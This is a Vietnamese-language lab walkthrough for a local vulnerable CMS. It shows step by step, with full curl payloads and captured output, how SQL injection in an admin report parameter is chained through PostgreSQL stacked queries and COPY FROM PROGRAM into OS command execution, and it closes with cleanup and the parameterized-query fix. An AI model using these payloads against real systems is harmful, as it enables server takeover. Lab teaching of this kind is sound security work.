# Hướng 3: PostgreSQL COPY FROM PROGRAM -> Command Output -> RCE

> Chỉ sử dụng trong lab local `BlueMarket CMS`. Payload chỉ dùng các lệnh an toàn như `id`, `whoami`, `hostname`, `pwd`.

## 1. Vị trí lỗi trong app

Chức năng admin nhìn thấy:

```text
Admin -> Reports -> System Reports
Route: /admin/reports?type=health
```

File xử lý:

```text
app/src/Controllers/ReportController.php
```

Đoạn code vulnerable:

```php
$sql = "SELECT type, label, description, query_name
        FROM report_templates
        WHERE type = '" . $type . "'
        ORDER BY id";
$templates = $db->queryAll($sql);
```

Role dùng trong vulnerable mode:

```text
report_user
```

Role này được grant trong `postgres/init.sql`:

```sql
GRANT pg_execute_server_program TO report_user;
```

Ý tưởng:

```text
SQLi trong report filter
-> stacked query
-> CREATE TABLE cmd_output(line TEXT)
-> COPY cmd_output FROM PROGRAM '<command>'
-> Report page đọc bảng cmd_output
-> command execution
```

## 2. Đăng nhập admin

```powershell
cd D:\SQL-lead-to-RCE\blue-market-lab
curl.exe -c admin.txt --data-urlencode "username=admin" --data-urlencode "password=admin123" http://localhost:5000/login
```

Kiểm tra:

```powershell
curl.exe -b admin.txt "http://localhost:5000/admin/reports?type=health"
```

Kỳ vọng: trang System Reports hiển thị.

## 3. Thử SQLi cơ bản

Payload:

```text
'
```

Gửi request:

```powershell
curl.exe -b admin.txt -G --data-urlencode "type='" http://localhost:5000/admin/reports
```

Nếu vulnerable mode, report filter có thể báo lỗi SQL vì query thành:

```sql
WHERE type = '''
```

Giải thích:

```text
Dấu ' làm vỡ chuỗi SQL
-> PostgreSQL parser báo lỗi
-> chứng minh tham số type đi vào SQL trực tiếp
```

## 4. Thử stacked query an toàn

Mục tiêu: tạo bảng kiểm tra để chứng minh có thể chèn câu SQL thứ hai.

Payload:

```sql
health'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line TEXT); INSERT INTO cmd_output VALUES ('stacked query works'); SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
```

Gửi request:

```powershell
$payload = @'
health'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line TEXT); INSERT INTO cmd_output VALUES ('stacked query works'); SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
'@

curl.exe -b admin.txt -G --data-urlencode "type=$payload" http://localhost:5000/admin/reports
```

Kiểm tra output:

```text
Ngay trên response hoặc khi mở lại /admin/reports?type=health,
khối Worker Output sẽ hiện dòng:
stacked query works
```

Nếu thấy:

```text
stacked query works
```

thì stacked query đã chạy.

## 5. Xây dựng payload COPY FROM PROGRAM từng phần

### 5.1. Đóng chuỗi type

Query gốc:

```sql
SELECT type, label, description, query_name
FROM report_templates
WHERE type = '<type>'
ORDER BY id
```

Đóng chuỗi:

```sql
health';
```

### 5.2. Dọn bảng output cũ

```sql
DROP TABLE IF EXISTS cmd_output;
```

### 5.3. Tạo bảng output

```sql
CREATE TABLE cmd_output(line TEXT);
```

### 5.4. Chạy command OS qua PostgreSQL

Lệnh `id`:

```sql
COPY cmd_output FROM PROGRAM 'id';
```

Giải thích:

```text
PostgreSQL chạy chương trình `id` dưới quyền process PostgreSQL.
Stdout của lệnh được ghi vào bảng cmd_output.
```

### 5.5. Khép query cuối để ORDER BY id vẫn hợp lệ

```sql
SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
```

Giải thích:

```text
Query trong app được ghép thành nhiều dòng:
WHERE type = '<type>'
ORDER BY id

Nếu payload kết thúc bằng `--`, PostgreSQL chỉ comment đến hết dòng WHERE.
Dòng ORDER BY id vẫn còn, nên parser sẽ báo:
syntax error at or near "ORDER"
```

## 6. Payload hoàn chỉnh với id

```powershell
$payload = @'
health'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line TEXT); COPY cmd_output FROM PROGRAM 'id'; SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
'@

curl.exe -b admin.txt -G --data-urlencode "type=$payload" http://localhost:5000/admin/reports
```

Mở lại report để xem Worker Output:

```powershell
curl.exe -b admin.txt "http://localhost:5000/admin/reports?type=health"
```

Lần test ngày `2026-08-31` hiển thị:

```text
uid=999(postgres) gid=999(postgres) groups=999(postgres),101(ssl-cert)
```

## 7. Payload với các lệnh an toàn khác

### whoami

```powershell
$payload = @'
health'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line TEXT); COPY cmd_output FROM PROGRAM 'whoami'; SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
'@

curl.exe -b admin.txt -G --data-urlencode "type=$payload" http://localhost:5000/admin/reports
```

### hostname

```powershell
$payload = @'
health'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line TEXT); COPY cmd_output FROM PROGRAM 'hostname'; SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
'@

curl.exe -b admin.txt -G --data-urlencode "type=$payload" http://localhost:5000/admin/reports
```

### pwd

```powershell
$payload = @'
health'; DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line TEXT); COPY cmd_output FROM PROGRAM 'pwd'; SELECT type, label, description, query_name FROM report_templates WHERE '1'='1
'@

curl.exe -b admin.txt -G --data-urlencode "type=$payload" http://localhost:5000/admin/reports
```

## 8. Chuỗi giải thích khi báo cáo

```text
Admin System Report có tham số type
-> type được nối vào SQL
-> attacker đóng chuỗi và chèn stacked query
-> COPY FROM PROGRAM yêu cầu PostgreSQL chạy OS command
-> output của command vào bảng cmd_output
-> web report đọc cmd_output và hiển thị
-> SQLi đã thành RCE
```

## 9. Cleanup

```powershell
docker compose exec postgres psql -U postgres -d bluemarket -c "DROP TABLE IF EXISTS cmd_output;"
Remove-Item -Force admin.txt
```

## 10. Điều kiện để thành công

```text
1. APP_MODE=vulnerable.
2. Đã login admin.
3. SQLi cho phép stacked query.
4. report_user có role pg_execute_server_program.
5. PostgreSQL process được phép chạy command.
6. Output có thể ghi vào bảng và đọc lại.
```

## 11. Fixed mode chặn ở đâu

Trong fixed mode, `ReportController.php` dùng:

```php
$templates = $db->params(
    'SELECT type, label, description, query_name
     FROM report_templates
     WHERE type = $1
     ORDER BY id',
    [$type]
);
```

Và kết nối bằng `app_user`, role không có `pg_execute_server_program`.


